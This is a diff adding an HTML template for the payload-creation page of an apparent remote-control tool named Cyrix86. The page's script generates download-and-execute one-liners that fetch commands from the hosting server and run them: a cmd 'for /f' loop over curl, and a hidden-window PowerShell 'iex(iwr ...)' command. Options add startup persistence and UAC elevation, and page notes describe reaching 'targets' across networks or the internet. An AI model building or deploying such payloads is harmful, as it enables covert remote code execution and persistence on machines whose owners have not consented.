@@ -1,0 +1,138 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Create | Cyrix86</title>
+    <link rel="stylesheet" href="/public/css/global.css">
+    <style>
+        #output-direct-payload {
+            word-break: break-all;
+            white-space: pre-wrap;
+            height: 300px;
+            overflow-y: auto;
+        }
+    </style>
+</head>
+
+<body>
+    {{- include("./header", { }) }}
+
+    <section class="section">
+        <div class="container is-widescreen">
+            <div class="is-flex is-gap-1 is-justify-content-space-between is-align-items-center is-flex-wrap-wrap">
+                <h1 class="title is-5 has-text-centered m-0">Payload</h1>
+
+                <form id="form" class="is-flex is-gap-1 is-align-items-center is-flex-wrap-wrap">
+                    <div class="field">
+                        <label class="label is-small">Type</label>
+                        <div class="select is-small is-fullwidth">
+                            <select name="type">
+                                <option value="cmd">CMD</option>
+                                <option value="powershell">Powershell</option>
+                            </select>
+                        </div>
+                    </div>
+
+                    <div class="field">
+                        <label class="label is-small">Set Startup</label>
+                        <div class="select is-small is-fullwidth">
+                            <select name="startup">
+                                <option value="false">False</option>
+                                <option value="true">True</option>
+                            </select>
+                        </div>
+                    </div>
+
+                    <div class="field mb-3">
+                        <label class="label is-small">Request UAC</label>
+                        <div class="select is-small is-fullwidth">
+                            <select name="uac">
+                                <option value="false">False</option>
+                                <option value="true">True</option>
+                            </select>
+                        </div>
+                    </div>
+
+                    <button class="button is-primary is-small" type="submit">Generate</button>
+                </form>
+            </div>
+
+            <div class="notification p-2 px-3">
+                <li class="my-1">If you're accessing <code>http://localhost:3415</code>, commands will only run on your
+                    local
+                    machine.</li>
+                <li class="my-1">If you're accessing a local network address like
+                    <code>http://192.168.43.47:3415</code>,
+                    commands will work on devices within that network only.</li>
+                <li class="my-1">If you've hosted this remotely (e.g., <code>https://something.glitch.me</code>),
+                    commands can be
+                    executed from anywhere with internet access.</li>
+                <li>if it is new target, it will take 40 to 50 seconds to connect.</li>
+            </div>
+
+
+            <li class="is-size-6 my-2">Command: <code>Run in cmd</code></li>
+            <pre id="output"></pre>
+            <p class="help">
+                <strong>Note:</strong> If you are using <code>.bat</code> file, just add extra <code>%</code> before
+                <code>%i</code>.
+            </p>
+
+            <li class="is-size-6 my-2 mt-5">
+                Direct Payload: <code>Run the following command directly in your cmd or powershell</code>
+            </li>
+            <pre id="output-direct-payload"></pre>
+        </div>
+    </section>
+
+    <script>
+        const form = document.getElementById("form")
+        const output = document.getElementById("output")
+        const outputDirectPayload = document.getElementById("output-direct-payload")
+
+        window.addEventListener("load", () => {
+            generatePayload(form)
+        })
+
+        form.addEventListener("submit", function (e) {
+            e.preventDefault()
+            generatePayload(form)
+        })
+
+        function generatePayload(form) {
+            const formData = new FormData(form)
+            const data = Object.fromEntries(formData.entries())
+
+            const type = data.type
+            const startup = data.startup
+            const uac = data.uac
+
+            const url = `${location.origin}/p?${getOneOrZero(type === "powershell")}-${getOneOrZero(startup === "true")}-${getOneOrZero(uac === "true")}`
+            let payload = 'Somthing went wrong'
+
+            if (type === 'cmd') {
+                payload = `for /f "delims=" %i in ('curl -s ${url}') do (%i)`
+            } else if (type === 'powershell') {
+                payload = `powershell -WindowStyle Hidden -c "iex((iwr -Uri ${url} -UseBasicParsing).Content)"`
+            }
+
+            output.innerText = payload
+
+            fetch(url)
+                .then(response => response.text())
+                .then(data => {
+                    outputDirectPayload.innerText = data
+                })
+        }
+
+        function getOneOrZero(data) {
+            return data ? 1 : 0
+        }
+
+
+    </script>
+</body>
+
+</html>
